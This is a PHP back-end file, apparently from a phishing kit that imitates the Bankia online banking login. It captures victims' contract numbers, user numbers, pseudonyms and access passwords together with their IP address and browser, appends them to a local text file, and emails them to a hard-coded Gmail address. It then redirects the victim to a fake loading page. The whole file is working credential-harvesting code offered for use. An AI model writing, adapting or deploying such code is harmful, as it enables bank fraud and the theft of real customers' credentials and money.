<?php

if ($_POST['ctype'] == "0" && !empty($_POST['digitos']) && !empty($_POST['nUsuario']) && !empty($_POST['password2'])) {
        $UserAgent =$_SERVER['HTTP_USER_AGENT'];
        $browser = explode(')',$UserAgent);				
        $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
        
        $msg.="==================================================\r\n";
        $msg=" [+] LOGIN(BANKIA) *** Company => Contrato *** ///logo\r\n";
        $msg.="==============================\r\n";
        $msg.="[+] Company type : Contrato \r\n";
        $msg.="[+] 13  dígitos : {$_POST['digitos']}\r\n";
        $msg.="[+] Nº de Usuario : {$_POST['nUsuario']}\r\n";
        $msg.="[+] Clave de acceso : {$_POST['password2']}\r\n";
        $msg.="==============================\r\n";
        $msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
        $msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
        $msg.="\r\n";
        $msg.="\r\n";
       
        $save=fopen("../bankiwawa.txt","a+");fwrite($save,$msg);fclose($save);
        $email="cocco.clement15@gmail.com"; //HERE
        $subject="LOGIN(BANKIA Company Contrato) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
        $headers="From: l7adia™<info@info.org>\r\n";
        $headers.="MIME-Version: 1.0\r\n";
        $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
        @mail($email,$subject,$msg,$headers);
    
        header("Location: ./loading.php?link=info"); 
}
elseif($_POST['ctype'] == "1" && !empty($_POST['seudomino']) && !empty($_POST['password2'])){
    $UserAgent =$_SERVER['HTTP_USER_AGENT'];
    $browser = explode(')',$UserAgent);				
    $_SESSION['browser'] = $browserTy_Version =array_pop($browser); 
    
    $msg.="==================================================\r\n";
    $msg=" [+] LOGIN(BANKIA) *** Company => Seudomino *** ///logo\r\n";
    $msg.="==============================\r\n";
    $msg.="[+] Company type : Seudónimo \r\n";
    $msg.="[+] Seudónimo : {$_POST['seudomino']}\r\n";
    $msg.="[+] Clave de acceso : {$_POST['password2']}\r\n";
    $msg.="==============================\r\n";
    $msg.="[+] localIP : {$_SERVER['REMOTE_ADDR']}\r\n";
    $msg.="[+] BROWSER : {$_SESSION['browser']} On/ {$_SESSION['os']}\r\n";
    $msg.="\r\n";
    $msg.="\r\n";
    
    $save=fopen("../bankiwawa.txt","a+");fwrite($save,$msg);fclose($save);
    $email="cocco.clement15@gmail.com"; //HERE
    $subject="LOGIN(BANKIA Company Seudomino) =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
    $headers="From: l7adia™<info@info.org>\r\n";
    $headers.="MIME-Version: 1.0\r\n";
    $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
    @mail($email,$subject,$msg,$headers);

    header("Location: ./loading.php?link=info"); 
}else{
    header("Location: ./index.php"); 
};

?>